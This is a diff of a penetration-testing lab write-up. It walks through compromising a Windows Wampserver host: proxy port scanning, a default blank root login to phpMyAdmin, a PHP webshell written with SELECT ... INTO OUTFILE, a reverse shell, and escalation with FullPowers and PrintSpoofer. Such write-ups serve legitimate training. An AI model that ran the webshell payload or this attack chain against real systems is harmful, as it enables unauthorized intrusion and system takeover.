@@ -31,8 +31,7 @@ IP: 192.168.122.189
 - Executed PrintSpoofer and received a reverse shell as nt authority/system
 
 ## Improved skills
-- Learned of a new tool to recover missing 
-- 
+- Learned of a new tool to recover missing privileges for local service
 
 ## Used tools
 - nmap
@@ -74,58 +73,58 @@ Enumerated top 200 UDP ports:
 
 #### - Navigated to "http://192.168.231.189:3128" and found the following webpage:
 
-![](Pasted%20image%2020221026235704.png)
+![](Images/Pasted%20image%2020221026235704.png)
 
 #### - Googled "port 3128 enumeration" and found the following Hacktricks webpage:
 
-![](Pasted%20image%2020221026235844.png)
+![](Images/Pasted%20image%2020221026235844.png)
 
 #### - Attempted the following steps but I was unsuccessful:
 
-![](Pasted%20image%2020221027001124.png)
+![](Images/Pasted%20image%2020221027001124.png)
 
 #### - Googled "internal port scanner for Squid github" and found the following tool:
 
-![](Pasted%20image%2020221027001302.png)
+![](Images/Pasted%20image%2020221027001302.png)
 #InternalPortScannerForSquidProxy
 
 #### - Git cloned the found "spose" tool to my kali machine
 
 #### - Typed "python spose.py -h" and found the following usage:
 
-![](Pasted%20image%2020221027001834.png)
+![](Images/Pasted%20image%2020221027001834.png)
 
 #### - Typed "python spose.py --proxy http://192.168.231.189:3128 --target 192.168.231.189" and found  open ports 3306 and 8080:
 
-![](Pasted%20image%2020221027001951.png)
+![](Images/Pasted%20image%2020221027001951.png)
 
 #### - Navigated to my foxyproxy on my firefox browser in my kali machine and input the following:
 
-![](Pasted%20image%2020221027002106.png)
+![](Images/Pasted%20image%2020221027002106.png)
 #proxy
 
 #### - Turned the "Squid" proxy on and navigated to "http://192.168.231.189:8080" and found the following webpage showing it was running Wampserver version 3.2.3:
 
-![](Pasted%20image%2020221027002401.png)
+![](Images/Pasted%20image%2020221027002401.png)
 
 #### - Navigated to the bottom of the webpage where I found the link "phpinfo" and which redirected me to the phpinfo page:
 
-![](Pasted%20image%2020221027002453.png)
+![](Images/Pasted%20image%2020221027002453.png)
 
 #### - Searched for and noted the root directory of the web server "C:/wamp/www":
 
-![](Pasted%20image%2020221027002652.png)
+![](Images/Pasted%20image%2020221027002652.png)
 #PHPinfoWebServerRootDirectory #DocumentRoot
 
 #### - Navigated back to the wampserver webpage where I found and clicked into link phpmyadmin and was forwarded to the phpmyadmin login page to login to mysql:
 
-![](Pasted%20image%2020221027004707.png)
+![](Images/Pasted%20image%2020221027004707.png)
 
-![](Pasted%20image%2020221027005042.png)
+![](Images/Pasted%20image%2020221027005042.png)
 
 #### - Googled "phpmyadmin mysql default credentials" and found the following webpage showing username root and password is left blank:
 
-![](Pasted%20image%2020221027005200.png)
+![](Images/Pasted%20image%2020221027005200.png)
 ---
 
 # Exploitation
@@ -134,21 +133,21 @@ Enumerated top 200 UDP ports:
 
 #### - Entered credentials username root and password left as blank and logged in:
 
-![](Pasted%20image%2020221027005654.png)
+![](Images/Pasted%20image%2020221027005654.png)
 
  #### - Googled "phpmyadmin mysql root login exploit" and found the following webpage showing to click the SQL  link. I then typed SELECT "<?php system($_GET['cmd']); ?>"  INTO OUTFILE 'C:/wamp/www/cmd.php' and go
-![](Pasted%20image%2020221027143942.png)
+![](Images/Pasted%20image%2020221027143942.png)
 
-![](Pasted%20image%2020221027144117.png)
+![](Images/Pasted%20image%2020221027144117.png)
  #RootDefaultPasswordSqlInjectionWebshell
 
 #### -Navigated to "http://192.168.231.189:8080/cmd.php/cmd?=dir C:\Windows\system32" Then typed ctrl+f and nc.exe to confirm if netcat was downloaded on the machine and found it was not:
 
-![](Pasted%20image%2020221027144303.png)
+![](Images/Pasted%20image%2020221027144303.png)
 
 #### -Typed "http://192.168.231.189:8080/cmd.php/cmd?=systeminfo" to conirm the system architecture and confirm it was a x64 bit windows machine:
 
-![](Pasted%20image%2020221027144431.png)
+![](Images/Pasted%20image%2020221027144431.png)
 
 #### -Typed "updog -p 80" on my kali machine in the directory which had the nc64.exe file to host it
 
@@ -162,7 +161,7 @@ Enumerated top 200 UDP ports:
 
 #### -Typed "reverse.exe" on the firefox url bar to run the reverse shell payload and received a reverse shell as nt authority\local service:
 
-![](Pasted%20image%2020221027144555.png)
+![](Images/Pasted%20image%2020221027144555.png)
 
 
 ---
@@ -172,15 +171,15 @@ Enumerated top 200 UDP ports:
 
 #### -Find we are running as nt authority/local system but some privileges assigned to this account are missing:
 
-![](Pasted%20image%2020221027145646.png)
+![](Images/Pasted%20image%2020221027145646.png)
 
-![](Pasted%20image%2020221027145713.png)
+![](Images/Pasted%20image%2020221027145713.png)
 #LocalSystemMissingAccountPrivileges
 
 #### -Googled "local service restricted permissions github" and found the following tool to add the missing privileges back:
 
-![](Pasted%20image%2020221027145938.png)
-![](Pasted%20image%2020221027150012.png)
+![](Images/Pasted%20image%2020221027145938.png)
+![](Images/Pasted%20image%2020221027150012.png)
 
 
 ## Privilege Escalation vector
@@ -189,9 +188,9 @@ Enumerated top 200 UDP ports:
 
 #### -Type "FullPowers.exe" to run the tool and now have the missing privileges back and are all enabled:
 
-![](Pasted%20image%2020221027150126.png)
+![](Images/Pasted%20image%2020221027150126.png)
 
-![](Pasted%20image%2020221027150159.png)
+![](Images/Pasted%20image%2020221027150159.png)
 
 #### - As we have SeImpersonatePrivilege enabled I proceeded to downoload PrintSpoofer64.exe on target machine
 
@@ -199,6 +198,6 @@ Enumerated top 200 UDP ports:
 
 #### -Typed "PrintSpoofer64.exe -i -c cmd" and received a cmd session as nt authority/system:
 
-![](Pasted%20image%2020221027150259.png)
+![](Images/Pasted%20image%2020221027150259.png)
 
 ---
